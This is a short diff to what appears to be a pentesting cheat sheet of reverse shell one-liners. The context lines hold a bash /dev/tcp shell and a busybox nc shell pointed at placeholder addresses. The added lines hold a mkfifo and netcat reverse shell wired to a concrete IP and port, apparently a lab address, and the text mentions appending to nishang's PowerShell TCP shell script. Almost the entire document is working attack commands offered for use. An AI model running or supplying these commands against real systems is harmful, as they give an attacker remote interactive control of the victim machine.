@@ -336,6 +336,9 @@ bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
 # Busybox
 busybox nc <IP> <PORT> -e sh
 
+# BASH
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.110 1338 >/tmp/f
+
 ```
 ### Windows Shells
 Added to the bottom of nishangs Invoke-PowerShellTcp.ps1 file
